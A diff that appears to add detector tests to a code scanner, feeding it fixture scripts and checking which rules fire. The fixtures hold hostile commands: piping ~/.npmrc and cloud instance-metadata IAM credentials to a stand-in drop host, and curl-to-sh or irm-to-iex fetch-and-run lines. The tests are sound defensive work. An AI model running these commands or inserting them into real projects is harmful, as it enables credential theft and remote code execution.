@@ -80,3 +80,55 @@ def test_writing_a_credential_file_is_not_the_read_half(tmp_path: Path):
     reading = {"scripts/steal.sh": "#!/bin/sh\ncat ~/.npmrc | curl -d @- https://drop.example.invalid\n",
                "src/index.js": "fetch('https://api.example.invalid/v1');\n"}
     assert "ST-COMBO-EXFIL" in {f.id for f in _report(tmp_path / "b", reading).findings}
+
+
+# --- ruleset 57 -----------------------------------------------------------------------------
+
+def test_a_printed_command_is_not_a_run_one(tmp_path: Path):
+    files = {
+        "install.sh": '#!/bin/sh\necho "  curl -LsSf https://astral.sh/uv/install.sh | sh"\n',
+        "install.ps1":
+            'Write-Host "  powershell -ExecutionPolicy ByPass -c irm https://x/i.ps1 | iex"\n',
+    }
+    ids = {f.id for f in _report(tmp_path / "a", files).findings}
+    assert "ST-SHELL-PIPE-EXEC" not in ids and "ST-SHELL-EVASION" not in ids
+
+    run = {"install.sh": "#!/bin/sh\ncurl -LsSf https://astral.sh/uv/install.sh | sh\n"}
+    assert "ST-SHELL-PIPE-EXEC" in {f.id for f in _report(tmp_path / "b", run).findings}
+
+
+def test_instance_metadata_is_sensitive_only_when_it_is_asked_for_credentials(tmp_path: Path):
+    bootstrap = ('#!/bin/sh\nTOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" '
+                 '-H "X-aws-ec2-metadata-token-ttl-seconds: 60")\n'
+                 'INSTANCE_ID=$(curl -s "http://169.254.169.254/latest/meta-data/instance-id" '
+                 '-H "X-aws-ec2-metadata-token: $TOKEN")\n')
+    assert "ST-SENS-PATH" not in {
+        f.id for f in _report(tmp_path / "a", {"infra/bootstrap.sh": bootstrap}).findings
+    }
+
+    theft = ('#!/bin/sh\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ '
+             '| curl -d @- https://drop.example.invalid\n')
+    assert "ST-SENS-PATH" in {
+        f.id for f in _report(tmp_path / "b", {"steal.sh": theft}).findings
+    }
+
+
+def test_python_asking_metadata_for_its_own_instance_id(tmp_path: Path):
+    """The same narrowing on the AST path: a curl of instance-id is not a credential read."""
+    probe = (
+        "import subprocess\n"
+        'iid = subprocess.run(["curl", "-s",\n'
+        '    "http://169.254.169.254/latest/meta-data/instance-id"], capture_output=True)\n'
+    )
+    assert "ST-SENS-PATH-PY" not in {
+        f.id for f in _report(tmp_path / "a", {"infra/shutdown.py": probe}).findings
+    }
+
+    creds = (
+        "import urllib.request\n"
+        "r = urllib.request.urlopen(\n"
+        '    "http://169.254.169.254/latest/meta-data/iam/security-credentials/role")\n'
+    )
+    assert "ST-SENS-PATH-PY" in {
+        f.id for f in _report(tmp_path / "b", {"steal.py": creds}).findings
+    }
